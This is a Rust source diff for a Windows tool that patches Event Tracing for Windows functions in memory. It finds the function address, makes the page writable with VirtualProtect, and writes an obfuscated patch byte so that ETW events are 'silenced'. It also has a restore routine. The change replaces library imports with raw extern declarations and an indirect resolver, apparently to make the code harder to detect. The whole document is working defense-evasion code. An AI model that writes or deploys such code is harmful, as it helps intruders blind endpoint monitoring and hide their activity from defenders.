@@ -82,9 +82,15 @@ pub fn print_info(log: &LogSink) {
 #[cfg(windows)]
 pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     use std::ffi::CString;
-    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
-    use windows::core::PCSTR;
+    use crate::resolve;
+
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
+        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *mut std::ffi::c_void;
+    }
+
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
     let etw_target = EtwTarget::from_str(target)
         .ok_or_else(|| format!("unknown ETW target: {target}"))?;
@@ -94,14 +100,18 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     log.step("[1/4] GetModuleHandleA(...)".to_string());
     let dll_cstr = CString::new(dll_name.as_str())
         .map_err(|e| format!("invalid DLL name: {e}"))?;
-    let dll_handle = unsafe { GetModuleHandleA(PCSTR(dll_cstr.as_ptr() as *const u8)) }
-        .map_err(|e| format!("GetModuleHandleA failed: {e} — ntdll should always be loaded"))?;
+    let dll_handle = unsafe { GetModuleHandleA(dll_cstr.as_ptr() as *const u8) };
+    if dll_handle.is_null() {
+        return Err(format!("GetModuleHandleA failed — {dll_name} should always be loaded"));
+    }
 
     log.step("[2/4] GetProcAddress(...)".to_string());
     let func_cstr = CString::new(func_name.as_str())
         .map_err(|e| format!("invalid function name: {e}"))?;
-    let func_addr = unsafe { GetProcAddress(dll_handle, PCSTR(func_cstr.as_ptr() as *const u8)) }
-        .ok_or_else(|| format!("GetProcAddress failed: {func_name} not found in {dll_name}"))?;
+    let func_addr = unsafe { GetProcAddress(dll_handle, func_cstr.as_ptr() as *const u8) };
+    if func_addr.is_null() {
+        return Err(format!("GetProcAddress failed: {func_name} not found in {dll_name}"));
+    }
     let addr = func_addr as usize;
     log.detail(format!("  Address: 0x{addr:016X}"));
 
@@ -109,32 +119,26 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     log.detail(format!("  Original first byte: 0x{original_byte:02X}"));
 
     log.step("[3/4] VirtualProtect → PAGE_EXECUTE_READWRITE".to_string());
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
-            addr as *const std::ffi::c_void,
-            1,
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        )
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(addr as *const std::ffi::c_void, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)
+    };
+    if ok == 0 {
+        return Err("VirtualProtect (make writable) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect (make writable) failed: {e}"))?;
 
     log.step("[4/4] Writing patch byte → restoring protection".to_string());
     unsafe {
         *(addr as *mut u8) = crate::obf::byte(crate::obf::ETW_PATCH);
     }
 
-    let mut discard = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
-            addr as *const std::ffi::c_void,
-            1,
-            old_protect,
-            &mut discard,
-        )
+    let mut discard: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(addr as *const std::ffi::c_void, 1, old_protect, &mut discard)
+    };
+    if ok == 0 {
+        return Err("VirtualProtect (restore) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect (restore) failed: {e}"))?;
 
     log.info(format!("  ✓ {func_name} patched — ETW events silenced"));
 
@@ -147,21 +151,25 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
 
 #[cfg(windows)]
 pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
-    use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+    use crate::resolve;
+
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
     let addr = state.address;
     log.step(format!("[1/2] VirtualProtect → PAGE_EXECUTE_READWRITE (0x{addr:016X})"));
 
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(
             addr as *const std::ffi::c_void,
             state.original_bytes.len(),
             PAGE_EXECUTE_READWRITE,
             &mut old_protect,
         )
+    };
+    if ok == 0 {
+        return Err("VirtualProtect (make writable) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect (make writable) failed: {e}"))?;
 
     log.step("[2/2] Restoring original bytes".to_string());
     for (i, &byte) in state.original_bytes.iter().enumerate() {
@@ -170,16 +178,18 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
         }
     }
 
-    let mut discard = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
+    let mut discard: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(
             addr as *const std::ffi::c_void,
             state.original_bytes.len(),
             old_protect,
             &mut discard,
         )
+    };
+    if ok == 0 {
+        return Err("VirtualProtect (restore) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect (restore) failed: {e}"))?;
 
     log.info(format!("  ✓ {} restored to original bytes", state.target));
     Ok(())
